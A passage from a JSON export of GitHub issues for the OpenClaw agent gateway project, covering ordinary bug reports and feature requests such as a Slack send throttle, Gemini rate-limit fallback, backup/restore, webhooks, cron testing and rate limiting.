      "title": "Feature: outbound message throttle for Slack (timestamp ordering)",
      "body": "## Problem\n\nSlack sorts messages by timestamp with ~1 second resolution. When an agent sends multiple messages in rapid succession (within the same second), Slack can display them in arbitrary order. This is a Slack-specific issue — other platforms have finer-grained timestamps or sort by message ID.\n\n## Proposed Solution\n\nAdd a configurable outbound send throttle for Slack, e.g.:\n\n```json\n{\n  \"channels\": {\n    \"slack\": {\n      \"sendThrottleMs\": 1000\n    }\n  }\n}\n```\n\nThis would enforce a minimum delay (default 1000ms / 1 second) between sequential outbound Slack messages from the same session/agent, ensuring timestamps are always distinct and messages display in the correct order. A full second default guarantees no overlap given Slack's ~1s timestamp resolution.\n\n## Scope\n\n- Slack-specific (other channels don't appear to have this issue)\n- Should apply to all outbound message types: channel messages, thread replies, and DMs\n- Should be configurable (some users may want to adjust the delay)\n\n## Current Workaround\n\nAgents must manually avoid sending multiple messages in quick succession, which is error-prone and depends on the LLM remembering to do so.",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13627",
      "createdAt": "2026-02-10T19:28:20Z",
      "updatedAt": "2026-02-10T19:29:47Z",
      "author": "doomclaw",
      "labels": [],
      "taxonomy": {
        "channels": [
          "slack"
        ],
        "platforms": [],
        "components": [
          "config"
        ]
      }
    },
    {
      "number": 13625,
      "title": "[Bug]: Google Chat webhook handler broken in 2026.2.9 - doesn't receive requests",
      "body": "## Summary\n\nUpgraded from 2026.2.2-3 to 2026.2.9. Handler logs \"starting Google Chat webhook\" but doesn't actually register to receive requests. Downgrading\n to 2026.2.2-3 fixes it.\n - Environment: Linux, Node 22.22.0, Tailscale Funnel\n\n",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13625",
      "createdAt": "2026-02-10T19:26:58Z",
      "updatedAt": "2026-02-10T19:26:58Z",
      "author": "scottsheppard",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [
          "googlechat"
        ],
        "platforms": [
          "linux"
        ],
        "components": []
      }
    },
    {
      "number": 13623,
      "title": "[Bug]: Model-Specific google-gemini-cli  429 Error Triggers Global Auth Profile Cooldown (Killing Fallbacks)",
      "body": "Description:\nWhen using the google-gemini-cli provider with a configured fallback chain (e.g., gemini-3-pro -> gemini-2.5-flash), receiving a 429 Quota Exhausted error on the primary model causes the provider to mark the entire Auth Profile as \"cooldown/unavailable.\"\n\nThis prevents the fallback models from running, even though they (likely) have independent quotas or are cheaper/unlimited. The agent fails immediately with \"No available auth profile\" for all subsequent models in the chain.\n\nExpected Behavior:\nA 429 error on gemini-3-pro should only mark gemini-3-pro as unavailable. The provider should proceed to try gemini-2.5-flash using the same Auth Profile (since quotas are often model-specific).\n\nActual Behavior:\nThe first model hits 429. The system logs:\ngoogle-gemini-cli/gemini-2.5-pro: No available auth profile for google-gemini-cli (all in cooldown or unavailable).\nResult: Total agent failure despite valid fallbacks.\n\nLogs:\n\n⚠️ Agent failed before reply: All models failed (3): \ngoogle-gemini-cli/gemini-3-pro-preview: Cloud Code Assist API error (429): You have exhausted your capacity on this model. (rate_limit) \n| google-gemini-cli/gemini-2.5-pro: No available auth profile for google-gemini-cli (all in cooldown or unavailable). (rate_limit) \n| google-gemini-cli/gemini-2.5-flash: No available auth profile for google-gemini-cli (all in cooldown or unavailable). (rate_limit).\n\nEnvironment:\n\n• Provider: google-gemini-cli\n• Auth Mode: OAuth (Single Profile)\n• Agent Config: Primary + Fallbacks list",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13623",
      "createdAt": "2026-02-10T19:17:05Z",
      "updatedAt": "2026-02-10T19:21:29Z",
      "author": "asfura",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3880219429,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13623#issuecomment-3880219429",
          "createdAt": "2026-02-10T19:21:29Z",
          "updatedAt": "2026-02-10T19:21:29Z",
          "author": "asfura",
          "body": "Ok go ahead "
        }
      ]
    },
    {
      "number": 13616,
      "title": "Add backup/restore utility for config, cron jobs, and session history",
      "body": "## Problem\n\nCurrently, there's no standardized way to:\n- Backup OpenClaw configuration and state\n- Migrate between environments (dev → staging → prod)\n- Recover from catastrophic failures\n- Export/import cron jobs\n- Archive session history\n\nThis makes disaster recovery difficult and environment setup manual.\n\n## Proposed Solution\n\nAdd built-in backup/restore commands:\n\n### CLI Commands\n\n```bash\n# Export everything\nopenclaw backup export --output backup.tar.gz\n\n# Export specific components\nopenclaw backup export --cron-jobs --output cron-backup.json\nopenclaw backup export --config --output config-backup.json\nopenclaw backup export --sessions --since 7d --output sessions.jsonl\n\n# Import/restore\nopenclaw backup import --input backup.tar.gz\nopenclaw backup import --cron-jobs cron-backup.json --merge\n\n# List backups (if stored in S3/cloud)\nopenclaw backup list\nopenclaw backup restore <backup-id>\n```\n\n### What Gets Backed Up\n\n**Core:**\n- `openclaw.json` config\n- Cron jobs (schedules, payloads, run history)\n- Skills and scripts\n- Workspace files (MEMORY.md, SOUL.md, etc.)\n\n**Optional:**\n- Session history (transcripts)\n- Exec approvals\n- Node pairing state\n\n**Excluded (sensitive):**\n- API keys/tokens (use secrets management instead)\n- Logs (too large)\n\n### Features\n\n- **Incremental backups:** Only changed files since last backup\n- **Cloud storage:** S3, Azure Blob, GCS integration\n- **Encryption:** Encrypt backups at rest\n- **Scheduled backups:** Cron job to auto-backup daily/weekly\n- **Disaster recovery:** Single command to restore entire gateway\n\n### Configuration\n\n```json\n{\n  \"backup\": {\n    \"enabled\": true,\n    \"schedule\": \"0 2 * * *\",\n    \"storage\": {\n      \"type\": \"s3\",\n      \"bucket\": \"openclaw-backups\",\n      \"prefix\": \"gateway-prod/\"\n    },\n    \"retention\": {\n      \"daily\": 7,\n      \"weekly\": 4,\n      \"monthly\": 12\n    },\n    \"encryption\": {\n      \"enabled\": true,\n      \"keyId\": \"aws:kms:us-east-1:key/abc123\"\n    }\n  }\n}\n```\n\n## Use Cases\n\n- **Disaster recovery:** Gateway instance fails, restore on new instance in minutes\n- **Environment promotion:** Export from dev, import to prod\n- **Migration:** Move from one cloud provider to another\n- **Testing:** Clone production config/jobs to staging for testing\n- **Compliance:** Maintain backups for audit/regulatory requirements\n- **Rollback:** Restore previous state if config change breaks things\n\n## Implementation Ideas\n\n- Use tar.gz with JSON manifests for each component\n- Support streaming backups for large session history\n- Pre-restore validation (check compatibility, conflicts)\n- Dry-run mode: show what would be restored without actually doing it\n- GitHub Actions: automated backups to repo releases\n\n## Impact\n\n**Medium** — Essential for production deployments, disaster recovery, and environment management.\n\n---\n\n**Example workflow:**\n\n```bash\n# Daily backup to S3 (automated via cron)\nopenclaw backup export --output s3://openclaw-backups/gateway-prod/2026-02-10.tar.gz\n\n# Disaster: EC2 instance lost\n# 1. Spin up new instance\n# 2. Restore latest backup\nopenclaw backup restore s3://openclaw-backups/gateway-prod/latest.tar.gz\n\n# Gateway fully restored with all cron jobs, config, sessions\n```\n\nRelated: Memory archival script (already exists for workspace files, but no unified backup/restore)",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13616",
      "createdAt": "2026-02-10T18:59:51Z",
      "updatedAt": "2026-02-10T19:16:51Z",
      "author": "trevorgordon981",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux"
        ],
        "components": [
          "gateway",
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3880189431,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13616#issuecomment-3880189431",
          "createdAt": "2026-02-10T19:16:51Z",
          "updatedAt": "2026-02-10T19:16:51Z",
          "author": "Piyushrathoree",
          "body": "@trevorgordon981  can I take this ?\n"
        }
      ]
    },
    {
      "number": 13621,
      "title": "[Feature]: Browser relay cannot interact with cross-origin iframe content (e.g., Salesforce Embedded Messaging)",
      "body": "## Description\n\nThe browser relay (Chrome extension) cannot interact with elements inside cross-origin iframes. The `snapshot` and `act` browser tools only see the parent page's DOM — elements within cross-origin iframes are invisible.\n\n## Steps to Reproduce\n\n1. Attach the browser relay to a tab containing a cross-origin iframe (e.g., Salesforce Embedded Messaging chat widget on any site using it)\n2. Run `browser snapshot` — iframe content is not included in the accessibility tree\n3. Run `browser snapshot` with `frame` parameter targeting the iframe — times out after 20s\n4. Attempt to dispatch JS events to iframe elements from the parent page — events don't reach cross-origin content (expected browser security behavior)\n\n## Expected Behavior\n\nThe relay should be able to snapshot and interact with elements inside cross-origin iframes, similar to how Playwright's `frameLocator()` or Chrome DevTools can inspect cross-origin frames via the debugger protocol.\n\n## Actual Behavior\n\n- `snapshot` returns only parent page elements; cross-origin iframe content is absent from the accessibility tree\n- `snapshot` with `frame` parameter (using iframe name, aria-label, or CSS selector) times out\n- No way to target iframe content for `act` commands\n- This blocks automation of extremely common embedded widgets: Salesforce Embedded Messaging, Intercom, Zendesk Chat, Drift, HubSpot chat, etc.\n\n## Technical Context\n\nCross-origin iframes are sandboxed by the browser's same-origin policy, so parent-page JavaScript cannot access their DOM. However, Chrome's debugger protocol (`chrome.debugger` API) *can* attach to and inspect cross-origin frames — the extension already uses `chrome.debugger` for the relay connection. The fix likely involves:\n\n1. Using `Target.getTargets` or `Target.attachToTarget` to discover iframe targets within the attached tab\n2. Creating separate CDP sessions for cross-origin frame targets\n3. Exposing frame selection through the `frame` parameter on snapshot/act\n\nPlaywright's `frameLocator()` handles this correctly when running locally (not through the relay), confirming the CDP protocol supports this capability.\n\n## Real-World Impact\n\nMany customer portals embed support chat via cross-origin iframes (Salesforce Embedded Messaging is one of the most common). Users who want to automate interactions with these chat widgets — a core use case for the browser relay — are currently blocked. Workaround requires a separate local Playwright script connecting directly to Chrome's debug port, bypassing the relay entirely.\n\n## Environment\n\n- OpenClaw: 2026.2.6\n- Browser: Chrome with relay extension (Windows, accessed from WSL gateway)\n- Example site: my.sunrun.com (Salesforce Embedded Messaging widget)\n",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13621",
      "createdAt": "2026-02-10T19:13:05Z",
      "updatedAt": "2026-02-10T19:13:05Z",
      "author": "litlmike",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "windows"
        ],
        "components": [
          "gateway",
          "websocket"
        ]
      }
    },
    {
      "number": 13620,
      "title": "Feature: Support Telegram media groups (albums) in message tool",
      "body": "## Feature Request\n\n**Problem:**\nCurrently the `message` tool can only send media files one at a time. Telegram supports `sendMediaGroup` API which allows sending 2-10 photos/videos as an album with a shared caption.\n\n**Use case:**\nWhen sending multiple related videos/images (e.g., a curated movie list with trailers), it's much cleaner to group them as an album with a single caption rather than sending them separately.\n\n**Proposed solution:**\nAdd support for `mediaGroup` or `album` parameter in the message tool that accepts an array of media paths, with a shared `caption` parameter.\n\nExample:\n```\nmessage action=send mediaGroup=[\"video1.mp4\", \"video2.mp4\"] caption=\"Movie trailers\"\n```\n\n**Platform:**\nTelegram (other platforms may have similar album features)\n\n---\n*Created via Clawdbot*",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13620",
      "createdAt": "2026-02-10T19:07:33Z",
      "updatedAt": "2026-02-10T19:07:33Z",
      "author": "dmnksss",
      "labels": [],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [],
        "components": [
          "websocket"
        ]
      }
    },
    {
      "number": 4575,
      "title": "Sessions dropdown only shows current agent:main:main after creating new session",
      "body": "After clicking the new session button (next to Send), the new session replaces the old one. In the top-right sessions dropdown only a single entry shows:  for the new session. Previously, the dropdown listed multiple sessions (e.g., new session plus Telegram session and TUI session). Now all appear merged or replaced, so only the current session is visible.\\n\\n**Steps to Reproduce**\\n1. Open webchat UI.\\n2. Click the new session button next to Send.\\n3. Open the sessions dropdown (top right).\\n\\n**Expected**\\nMultiple sessions should be listed (main + Telegram + TUI), allowing switching between them, as before.\\n\\n**Actual**\\nOnly one session appears:  (the current session). Older sessions are not visible.",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/4575",
      "createdAt": "2026-01-30T10:24:40Z",
      "updatedAt": "2026-02-10T19:06:50Z",
      "author": "AZLabsAI",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [],
        "components": [
          "web-ui",
          "tui",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3866359709,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4575#issuecomment-3866359709",
          "createdAt": "2026-02-08T07:11:30Z",
          "updatedAt": "2026-02-08T07:11:30Z",
          "author": "matthew77",
          "body": "i have the same issue. this one is critical, now i can only work with single session in openclaw. in the session history, you cannot see the previous sessions. but the sessoin files are save, they just become orphan. \nthe workaround is to ask openclaw bring them back (reindex) them manually. "
        },
        {
          "id": 3880142723,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4575#issuecomment-3880142723",
          "createdAt": "2026-02-10T19:06:50Z",
          "updatedAt": "2026-02-10T19:06:50Z",
          "author": "kundeng",
          "body": "same problem. "
        }
      ]
    },
    {
      "number": 13614,
      "title": "Dashboard: Activity feed doesn't use full available height on desktop",
      "body": "## Description\n\nOn desktop, the activity feed section in the dashboard does not use 100% of the available vertical space. There is unused whitespace below the feed.\n\n## Expected Behavior\n\nThe activity feed should expand to fill all available vertical space in its container on desktop viewports.\n\n## Environment\n\n- OpenClaw latest\n- Desktop browser",
      "state": "closed",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13614",
      "createdAt": "2026-02-10T18:59:48Z",
      "updatedAt": "2026-02-10T19:01:58Z",
      "author": "ahri-abdev",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "docker"
        ],
        "components": [
          "web-ui"
        ]
      }
    },
    {
      "number": 13612,
      "title": "Dashboard: Activity feed shows noise from no-op cron executions",
      "body": "## Description\n\nWhen a cron job (e.g., a tasks-worker that checks for pending tasks) runs and finds nothing to do, it still appears in the activity feed. This creates a lot of noise, especially for jobs that run frequently (e.g., every 5 minutes).\n\n## Expected Behavior\n\nEither:\n- Allow filtering/hiding cron executions that produced no meaningful output\n- Add a `delivery: 'none'` or similar option that suppresses activity feed entries (not just announcements)\n- Let cron jobs return a \"nothing to report\" signal that skips the activity feed entry\n\n## Current Behavior\n\nEvery cron execution appears in the activity feed regardless of whether it produced any output or action.\n\n## Environment\n\n- OpenClaw latest\n- Channel: Telegram",
      "state": "closed",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13612",
      "createdAt": "2026-02-10T18:59:43Z",
      "updatedAt": "2026-02-10T19:01:57Z",
      "author": "ahri-abdev",
      "labels": [],
      "taxonomy": {
        "channels": [
          "telegram",
          "signal"
        ],
        "platforms": [],
        "components": [
          "web-ui",
          "websocket"
        ]
      }
    },
    {
      "number": 13619,
      "title": "Feature: Show cross-talk/spawn relationships in webchat UI",
      "body": "## Feature Request: Show cross-talk relationships in webchat UI\n\n### Problem\nWhen sessions are spawned via `sessions_spawn`, they announce results back to the parent session. Users currently have no visual indication of:\n1. Which sessions will announce to other sessions\n2. Which session is the parent of a spawned session\n3. When incoming messages are cross-talk announcements vs direct messages\n\nThis causes confusion and unexpected token burns when announcements arrive in expensive sessions.\n\n### Requested UI Changes\n\n**1. Session List (Sidebar)**\n- Add text indicator for spawned sessions: `[SPAWNED]` prefix or similar\n- Show parent relationship: `↑ parent-session-key` \n- Use non-emoji text indicators for accessibility\n\n**2. Chat Header (when viewing a session)**\n- If spawned: Show \"Parent: {session-key}\" \n- If has children: Show \"Children: {count} spawned sessions\"\n- Add \"Cross-talk: Will announce to {parent}\" warning\n\n**3. Message Indicators**\n- Mark messages that are cross-talk announcements vs direct user messages\n- Different styling for \"Announced from: {child-session}\" messages\n\n### Data Available\nSession entries already contain:\n- `spawnedBy`: parent session key (for spawned sessions)\n- `deliveryContext`: where responses go\n- Session key pattern indicates type (`:subagent:`, `:cron:`, `:main:`)\n\n### Mockup\n\nSidebar:\n```\nSessions\n─────────\n[SPAWNED] optimizer:subagent:abc123\n    ↑ main:main\n[MAIN] optimizer:main  \n[DM] optimizer:telegram:dm:ian\n```\n\nChat header:\n```\n┌─────────────────────────────────────┐\n│ optimizer:subagent:abc123           │\n│ Parent: main:main                   │\n│ [!] Cross-talk: Announces to parent │\n└─────────────────────────────────────┘\n```\n\n### Environment\n- OpenClaw version: 2026.2.6-3\n- Affects: Control UI webchat\n\n### Related\n- Cross-talk cannot be disabled via config\n- `maxPingPongTurns` doesn't affect announce behavior\n",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13619",
      "createdAt": "2026-02-10T19:00:55Z",
      "updatedAt": "2026-02-10T19:00:55Z",
      "author": "ianderrington",
      "labels": [],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [],
        "components": [
          "web-ui",
          "config"
        ]
      }
    },
    {
      "number": 13618,
      "title": "Add webhook support for external integrations and event triggers",
      "body": "## Problem\n\nOpenClaw currently operates as a closed system — it can call external APIs, but external systems can't easily trigger OpenClaw actions. This limits integration possibilities:\n\n- **External events can't trigger jobs:** GitHub releases, PagerDuty alerts, Stripe payments\n- **No bi-directional integrations:** Can send to Slack, but can't receive webhooks from non-chat platforms\n- **Manual polling required:** Have to poll external APIs instead of receiving push notifications\n- **Limited automation:** Can't chain OpenClaw with other tools in workflows\n\n## Proposed Solution\n\nAdd webhook endpoint support for receiving external events:\n\n### Configuration\n\n```json\n{\n  \"webhooks\": {\n    \"enabled\": true,\n    \"port\": 8080,\n    \"path\": \"/webhooks\",\n    \"endpoints\": [\n      {\n        \"id\": \"github-releases\",\n        \"path\": \"/github/releases\",\n        \"secret\": \"${env:GITHUB_WEBHOOK_SECRET}\",\n        \"action\": {\n          \"kind\": \"agentTurn\",\n          \"message\": \"New GitHub release received: {{payload.release.tag_name}}\",\n          \"sessionTarget\": \"isolated\",\n          \"delivery\": {\n            \"channel\": \"slack\",\n            \"to\": \"#deploy-notifications\"\n          }\n        }\n      },\n      {\n        \"id\": \"stripe-payment\",\n        \"path\": \"/stripe/payment\",\n        \"secret\": \"${env:STRIPE_WEBHOOK_SECRET}\",\n        \"filter\": \"event.type === 'payment_intent.succeeded'\",\n        \"action\": {\n          \"kind\": \"agentTurn\",\n          \"message\": \"Payment received: ${{payload.amount}} from {{payload.customer}}\"\n        }\n      }\n    ]\n  }\n}\n```\n\n### Features\n\n**Security:**\n- HMAC signature verification (per provider: GitHub, Stripe, etc.)\n- IP allowlisting\n- Rate limiting per endpoint\n- Optional basic auth\n\n**Payload Handling:**\n- Template variables in message: `{{payload.field}}`\n- JSON path filtering: only trigger on specific events\n- Transform webhooks to OpenClaw events\n\n**Actions:**\n- Trigger cron jobs\n- Spawn agent turns\n- Run exec commands (with approvals)\n- Send messages to channels\n\n**Integrations:**\n- GitHub (releases, PRs, issues)\n- Stripe (payments)\n- PagerDuty (incidents)\n- Datadog (alerts)\n- Custom webhooks\n\n### CLI Commands\n\n```bash\n# List configured webhooks\nopenclaw webhooks list\n\n# Test webhook\nopenclaw webhooks test github-releases --payload test.json\n\n# Show recent webhook calls\nopenclaw webhooks logs --endpoint github-releases --limit 10\n```\n\n## Use Cases\n\n**1. GitHub Integration:**\n- New release → notify #deploy-notifications\n- PR opened → trigger review workflow\n- Issue labeled \"bug\" → post to #bugs channel\n\n**2. Monitoring Alerts:**\n- PagerDuty incident → analyze logs and suggest fixes\n- Datadog alert → query metrics and report in Slack\n- CloudWatch alarm → run AWS diagnostics\n\n**3. Payment Processing:**\n- Stripe payment succeeded → send confirmation, update records\n- Subscription cancelled → notify team\n\n**4. Custom Workflows:**\n- Zapier/Make.com → trigger OpenClaw actions\n- Internal microservices → send events to OpenClaw\n- IoT devices → trigger automations\n\n**5. CI/CD:**\n- Jenkins build complete → announce results\n- Docker image pushed → trigger deployment job\n\n## Implementation Ideas\n\n- Express.js webhook routes\n- Per-endpoint middleware for auth/validation\n- Store recent webhook calls for debugging\n- Emit metrics (webhook calls, success/failure rates)\n- Retry mechanism for failed actions\n\n## Security Considerations\n\n- Always validate signatures (GitHub, Stripe use HMAC)\n- Never expose without TLS in production\n- IP allowlisting for known sources\n- Rate limiting to prevent DoS\n\n## Impact\n\n**Medium-High** — Unlocks external integrations, enables event-driven automation, positions OpenClaw as workflow orchestration hub.\n\n---\n\n**Example: GitHub Release Notification**\n\nUser creates GitHub release → GitHub sends webhook → OpenClaw receives event → Spawns agent to analyze release notes → Posts summary to Slack #deploy-notifications\n\n**Example: PagerDuty Incident Response**\n\nPagerDuty fires alert → Webhook → OpenClaw queries CloudWatch logs → Spawns agent to analyze → Posts findings + suggested fixes to Slack → Escalates to on-call if unresolved\n\nThis makes OpenClaw a central automation hub for external events.",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13618",
      "createdAt": "2026-02-10T18:59:54Z",
      "updatedAt": "2026-02-10T18:59:54Z",
      "author": "trevorgordon981",
      "labels": [],
      "taxonomy": {
        "channels": [
          "slack"
        ],
        "platforms": [
          "macos",
          "docker"
        ],
        "components": [
          "gateway",
          "config",
          "websocket"
        ]
      }
    },
    {
      "number": 13617,
      "title": "Add testing framework for cron jobs and skills (dry-run mode)",
      "body": "## Problem\n\nCurrently, testing cron jobs and skills requires:\n- Running them in production (risky)\n- Manually triggering with `--force` (but still executes for real)\n- No way to validate behavior without side effects\n\nThis makes it difficult to:\n- Test new jobs before deploying\n- Validate changes to existing jobs\n- Run tests in CI/CD pipelines\n- Debug without affecting production data\n\n## Proposed Solution\n\nAdd a dry-run/test mode for cron jobs and skills:\n\n### CLI Commands\n\n```bash\n# Dry-run a cron job (no execution, show what would happen)\nopenclaw cron test <job-id>\n\n# Test a skill without side effects\nopenclaw skill test <skill-name> --input \"test data\"\n\n# Validate cron job config\nopenclaw cron validate <job-id>\n```\n\n### Features\n\n**Dry-Run Mode:**\n- Parse and validate job config\n- Show what message would be sent\n- Display delivery target (channel, DM, etc.)\n- Estimate execution time based on previous runs\n- Check if all required tools/APIs are available\n\n**Mocking Layer:**\n- Stub external API calls (Slack, Discord, web_search, etc.)\n- Log what would be called without actually calling\n- Option to use real APIs in \"read-only\" mode\n\n**CI/CD Integration:**\n- Exit codes: 0 = valid, non-zero = invalid\n- JSON output: `--json` flag for programmatic parsing\n- GitHub Actions example workflow\n\n### Configuration\n\n```json\n{\n  \"testing\": {\n    \"dryRun\": true,\n    \"mockApis\": [\"slack\", \"discord\", \"web_search\"],\n    \"allowReadOnly\": [\"web_search\"]\n  }\n}\n```\n\n## Use Cases\n\n- **Pre-deployment validation:** Test jobs locally before pushing to prod\n- **CI/CD pipelines:** Automated testing in GitHub Actions, GitLab CI\n- **Debugging:** Understand what a job does without side effects\n- **Skill development:** Test new skills without affecting production\n- **Onboarding:** New users can safely experiment\n\n## Implementation Ideas\n\n- Add `dryRun` flag to agent execution context\n- Tool wrappers that check `dryRun` and return mock responses\n- Record tool calls in test mode for inspection\n- Example: `message.send()` logs \"Would send to #channel: <text>\" instead of actually sending\n\n## Impact\n\n**Medium-High** — Improves developer experience, enables safe testing, reduces production incidents from untested changes.\n\n---\n\n**Example output:**\n\n```bash\n$ openclaw cron test dd8b8028-d589-4870-9627-823e485e6f26\n\n✓ Job config valid\n✓ Schedule: 0 9 * * 1-5 (America/Los_Angeles)\n✓ Next run: 2026-02-11 09:00:00 PT\n\nWould execute:\n  Session: isolated\n  Message: \"Deliver Master Gordon's morning market briefing...\"\n  \nWould call tools:\n  - web_search (2 calls)\n  - exec (1 call: aws cloudwatch...)\n  \nWould deliver to:\n  - Channel: #cron-jobs (C0ADKPMK1QB)\n  - Mode: announce\n  \nEstimated duration: 45-60 seconds (based on previous runs)\n```",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13617",
      "createdAt": "2026-02-10T18:59:52Z",
      "updatedAt": "2026-02-10T18:59:52Z",
      "author": "trevorgordon981",
      "labels": [],
      "taxonomy": {
        "channels": [
          "discord",
          "slack"
        ],
        "platforms": [
          "linux"
        ],
        "components": [
          "onboarding",
          "config",
          "websocket"
        ]
      }
    },
    {
      "number": 13615,
      "title": "Add rate limiting and throttling for external API calls",
      "body": "## Problem\n\nOpenClaw makes many external API calls (LLM providers, web search, Slack, Discord, etc.) but lacks:\n\n- **Rate limit protection:** Hits provider limits unexpectedly\n- **Cost control:** Runaway API usage from bugs or misconfigurations\n- **Backpressure handling:** No automatic retry when rate limited\n- **Visibility:** Can't see how close to limits you are\n\nThis causes:\n- Unexpected 429 errors from providers\n- Surprise bills (Anthropic, OpenAI token overages)\n- Service degradation when limits exceeded\n\n## Proposed Solution\n\nAdd configurable rate limiting and throttling:\n\n### Per-Provider Limits\n\n```json\n{\n  \"rateLimits\": {\n    \"anthropic\": {\n      \"requestsPerMinute\": 50,\n      \"tokensPerMinute\": 100000,\n      \"strategy\": \"sliding-window\"\n    },\n    \"web_search\": {\n      \"requestsPerMinute\": 10,\n      \"requestsPerDay\": 1000\n    },\n    \"slack\": {\n      \"requestsPerMinute\": 60\n    }\n  }\n}\n```\n\n### Features\n\n**Rate Limiting:**\n- Track requests per provider/endpoint\n- Block when limit would be exceeded\n- Queue requests with configurable max queue size\n- Emit warnings when approaching limits\n\n**Throttling:**\n- Automatic backoff when hitting 429 responses\n- Exponential backoff with jitter\n- Configurable max retries\n\n**Cost Controls:**\n- Daily/monthly token budgets per model\n- Alert when 80%, 90%, 100% of budget consumed\n- Option to block once budget exceeded\n\n**Observability:**\n- Metrics: current usage vs limits\n- Dashboard: `openclaw limits status`\n- Alerts via Slack/Discord when limits approached\n\n### CLI Commands\n\n```bash\n# Check current usage\nopenclaw limits status\n\n# Set temporary limit\nopenclaw limits set anthropic --rpm 100\n\n# Reset limits\nopenclaw limits reset\n```\n\n## Use Cases\n\n- **Cost protection:** Prevent runaway API costs from bugs\n- **Provider compliance:** Stay within Anthropic/OpenAI rate limits\n- **Graceful degradation:** Queue instead of fail when busy\n- **Multi-tenant:** Different limits per agent or user\n- **Development:** Lower limits in dev to avoid accidentally burning tokens\n\n## Implementation Ideas\n\n- Use `limiter` or `bottleneck` npm packages\n- Per-provider middleware in tool wrappers\n- Persistent storage of current usage (Redis or local file)\n- Metrics integration (see observability issue)\n\n## Example Scenarios\n\n**Scenario 1: Rate limit hit**\n```\n[rate-limit] Anthropic: 49/50 RPM used, queuing request\n[rate-limit] Anthropic: limit reached, waiting 12s before retry\n```\n\n**Scenario 2: Budget exceeded**\n```\n[cost-control] Daily token budget exceeded (105k/100k)\n[cost-control] Blocking further requests until midnight PT\n[alert] Posted alert to #cloudwatch-alerts\n```\n\n**Scenario 3: Approaching limit**\n```\n[rate-limit] Warning: web_search 900/1000 daily requests used (90%)\n```\n\n## Impact\n\n**Medium** — Prevents surprise costs, improves reliability by gracefully handling rate limits, essential for production deployments with budget constraints.\n\n---\n\nRelated: Observability issue (metrics would track rate limit usage)",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13615",
      "createdAt": "2026-02-10T18:59:51Z",
      "updatedAt": "2026-02-10T18:59:51Z",
      "author": "trevorgordon981",
      "labels": [],
      "taxonomy": {
        "channels": [
          "discord",
          "slack"
        ],
        "platforms": [
          "linux"
        ],
        "components": [
          "gateway",
          "web-ui",
          "config"
        ]
      }
    },
    {
      "number": 13613,
      "title": "Add multi-gateway cron job coordination for HA deployments",
      "body": "## Problem\n\nWhen running multiple OpenClaw gateways (high availability, load balancing, blue/green deployments), there's no coordination mechanism for cron jobs. This causes:\n\n- **Duplicate execution:** Multiple gateways fire the same job simultaneously\n- **Race conditions:** Jobs that modify state (file writes, API calls) conflict\n- **Cost multiplier:** Same job runs N times if you have N gateways\n- **Inconsistent state:** Deliveries sent multiple times to Slack/Discord\n\nCurrently, cron jobs are gateway-local with no distributed coordination.\n\n## Proposed Solution\n\nAdd distributed locking/coordination for cron jobs across multiple gateways:\n\n### Approach 1: Leader Election\n- One gateway is elected \"cron leader\" and executes all jobs\n- If leader fails, another gateway takes over\n- Uses Redis, etcd, or DynamoDB for leader election\n\n### Approach 2: Distributed Locks\n- Each job acquires a lock before execution\n- Lock expires after job completes or timeout\n- Other gateways skip if lock held\n- Uses Redis (SETNX), DynamoDB (conditional writes), or etcd\n\n### Configuration\n\n```json\n{\n  \"cron\": {\n    \"coordination\": {\n      \"enabled\": true,\n      \"backend\": \"redis\",\n      \"redis\": {\n        \"url\": \"redis://localhost:6379\"\n      },\n      \"lockTtlMs\": 300000\n    }\n  }\n}\n```\n\n## Use Cases\n\n- **AWS Auto Scaling:** Multiple EC2 instances behind ALB\n- **Kubernetes:** Multiple gateway pods for HA\n- **Blue/Green Deployments:** Two gateways running during cutover\n- **Regional HA:** Gateways in multiple regions\n\n## Implementation Ideas\n\n- Use existing libraries: `redlock` (Redis), `etcd3` (etcd)\n- Graceful degradation: if coordination unavailable, emit warning but continue\n- Health check includes coordination backend status\n- CLI: `openclaw cron leader` to show which gateway is executing jobs\n\n## Impact\n\n**Medium-High** — Critical for production HA setups, prevents duplicate job execution and wasted API costs.\n\n---\n\nRelated to issue #13582 (cron reliability)\n\n**Note:** Many production deployments need HA but currently can't use cron safely with multiple gateways.",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13613",
      "createdAt": "2026-02-10T18:59:47Z",
      "updatedAt": "2026-02-10T18:59:47Z",
      "author": "trevorgordon981",
      "labels": [],
      "taxonomy": {
